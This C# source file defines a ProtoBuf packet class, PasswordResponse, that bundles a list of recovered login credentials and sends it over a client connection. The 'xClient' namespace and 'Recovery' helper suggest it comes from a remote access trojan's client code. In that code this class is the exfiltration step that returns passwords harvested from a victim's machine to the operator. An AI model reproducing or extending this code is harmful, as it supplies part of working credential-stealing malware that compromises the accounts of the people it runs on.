using ProtoBuf;
using System.Collections.Generic;
using xClient.Core.Recovery.Helper;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class PasswordResponse : IPacket
    {
        [ProtoMember(1)]
        public List<LoginInfo> Passwords { get; set; }

        public PasswordResponse()
        {
        }

        public PasswordResponse(List<LoginInfo> data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}